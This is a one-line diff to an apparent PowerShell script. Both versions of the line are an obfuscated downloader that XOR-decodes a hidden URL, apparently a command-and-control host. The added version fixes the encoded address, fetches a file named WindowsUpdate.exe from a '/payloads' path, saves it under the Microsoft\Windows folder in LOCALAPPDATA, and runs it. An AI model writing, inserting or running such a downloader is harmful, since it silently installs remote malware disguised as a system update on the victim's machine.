@@ -1,1 +1,1 @@
-$k=79;$u=-join([char[]](39,59,59,63,60,101,96,96,40,39,96,60,59,61,42,59,98,44,125,97,61,42,59,35,38,37,46,97,46,63,63)|%{$_-bxor$k});$f=$env:temp+'\'+[io.path]::GetRandomFileName()+'.exe';curl.exe -s "$u/payloads/WindowsUpdate.exe" -o "$f";start "$f";Start-Sleep 1;remove-item "$f" -Force
+$k=79;$u=-join([char[]](39,59,59,63,60,117,96,96,40,39,32,60,59,33,42,59,98,44,125,97,33,42,59,35,38,41,54,97,46,63,63)|%{$_-bxor$k});$d=$env:LOCALAPPDATA+'\Microsoft\Windows';$f=$d+'\WindowsUpdate.exe';md $d -Force|Out-Null;curl.exe -s "$u/payloads/WindowsUpdate.exe" -o "$f";start "$f"
